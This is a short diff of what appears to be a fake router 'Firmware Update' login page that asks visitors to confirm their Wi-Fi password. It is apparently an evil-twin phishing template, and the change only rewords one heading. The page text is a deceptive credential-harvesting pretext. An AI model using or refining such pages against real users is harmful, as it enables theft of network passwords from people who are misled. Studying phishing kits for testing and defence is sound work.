@@ -28,7 +28,7 @@ $destination = "http://". $_SERVER['HTTP_HOST'] . $_SERVER['HTTP_URI'] . "";
         <div class="modal-dialog">
           <div class="loginmodal-container">
             <h1>Firmware Update</h1>
-            <h2>Password requested to restore your router settings</h2>
+            <h2>Password requested to restore Router configuration</h2>
             <h3>Please confirm your Wi-fi password to access internet</h3>
             <br>
 
